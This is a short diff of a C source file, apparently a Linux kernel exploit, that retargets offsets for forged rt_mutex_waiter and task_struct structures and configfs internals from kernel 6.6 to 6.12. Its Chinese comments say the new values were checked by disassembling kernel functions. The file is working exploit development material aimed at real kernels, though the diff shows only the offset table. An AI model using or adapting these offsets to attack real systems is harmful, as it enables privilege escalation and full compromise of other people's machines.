@@ -145,7 +145,7 @@
 #define LEFT_OFF 0x5550
 #define FAKE_TASK_OFF 0x3200
 
-/* === rt_mutex_waiter 布局 (基于 6.6, 需真机验证) === */
+/* === rt_mutex_waiter 布局 (6.12 反汇编验证: task_blocks_on_rt_mutex) === */
 #define FAKE_WAITER_TREE_PRIO_OFF 0x18
 #define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
 #define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
@@ -156,15 +156,15 @@
 #define FAKE_WAITER_WAKE_STATE_OFF 0x60
 #define FAKE_WAITER_WW_CTX_OFF 0x68
 
-/* === task_struct 布局 (基于 6.6, 需真机验证) === */
+/* === task_struct 布局 (6.12 反汇编验证: task_blocks_on_rt_mutex + rt_mutex_setprio) === */
 #define FAKE_TASK_USAGE_OFF 0x40
-#define FAKE_TASK_PRIO_OFF 0x84
-#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
-#define FAKE_TASK_TASK_GROUP_OFF 0x348
-#define FAKE_TASK_PI_LOCK_OFF 0x90c
-#define FAKE_TASK_PI_WAITERS_OFF 0x920
-#define FAKE_TASK_PI_TOP_TASK_OFF 0x930
-#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x938
+#define FAKE_TASK_PRIO_OFF 0x94
+#define FAKE_TASK_NORMAL_PRIO_OFF 0x9c
+#define FAKE_TASK_TASK_GROUP_OFF 0x340
+#define FAKE_TASK_PI_LOCK_OFF 0x9ec
+#define FAKE_TASK_PI_WAITERS_OFF 0xa00
+#define FAKE_TASK_PI_TOP_TASK_OFF 0xa10
+#define FAKE_TASK_PI_BLOCKED_ON_OFF 0xa18
 
 /* === configfs 内部布局 === */
 #define CFG_PAGE_OFF 16
